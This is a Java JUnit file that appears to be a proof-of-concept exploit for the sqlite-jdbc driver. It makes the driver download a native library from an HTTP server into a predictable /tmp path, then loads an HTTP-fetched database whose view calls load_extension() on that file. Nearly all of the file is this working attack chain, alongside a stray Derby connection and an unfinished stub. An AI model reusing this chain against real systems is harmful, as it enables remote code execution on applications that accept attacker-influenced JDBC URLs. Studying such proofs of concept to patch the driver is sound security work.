package poc;

import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.Test;
import server.Server;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;

public class Poc {

    public static void createDb(String path) {
        File dbFile = new File("src/main/resources/poc.db");
        if (dbFile.exists()) {
            dbFile.delete();
        }

        try (Connection conn =
                 DriverManager.getConnection(
                     String.format("jdbc:sqlite:%s", "src/main/resources/poc.db"));) {
            conn.setAutoCommit(true);
            Statement statement = conn.createStatement();
            statement.execute(String.format("CREATE VIEW POC AS SELECT load_extension('%s', 'poc');", path));
            statement.close();
        } catch (SQLException e) {
            // ttk...
        }
    }

    private static Server server;

    @BeforeAll
    public static void startSlave() throws IOException {
        try {
            DriverManager.getConnection("jdbc:derby:db;create=true");
        } catch (SQLException e) {
            // ttk...
        }
        server = new Server(8001);
    }

    @AfterAll
    public static void stopServer() {
        server.close();
    }

    @Test
    public void createDbTest() {
        createDb("src/main/resources/poc.dylib");
    }

    // Only tested on ubuntu x86_64
    @Test
    public void sqlite() throws SQLException, MalformedURLException {

        String extensionUrl = "http://127.0.0.1:8001/poc.so";

        URL resourceAddr = new URL(extensionUrl);
        String extensionPath = String.format("/tmp/sqlite-jdbc-tmp-%d.db", resourceAddr.hashCode());
        System.out.println(extensionPath);

        createDb(extensionPath);

        System.out.println(System.getProperty("java.io.tmpdir"));

        // upload extension file
        Connection conn =
                DriverManager.getConnection(
                        String.format("jdbc:sqlite::resource:%s", extensionUrl));
        conn.close();

        // poc
        String url =
                "jdbc:sqlite::resource:http://127.0.0.1:8001/poc.db?enable_load_extension=true";
        Connection connection = DriverManager.getConnection(url);
        connection.setAutoCommit(true);

        Statement statement = connection.createStatement();
        statement.execute("SELECT * FROM POC");

        statement.close();
        connection.close();
    }

    @Test
    public void tmp() {
        System.out.println(System.getProperty("java.io.tmpdir"));
    }

    @Test
    public void magellan() throws SQLException {
        // TODO: Implement
        String url = "jdbc:sqlite:file:load.db?enable_load_extension=true";
        Connection connection = DriverManager.getConnection(url);
        connection.close();
    }
}
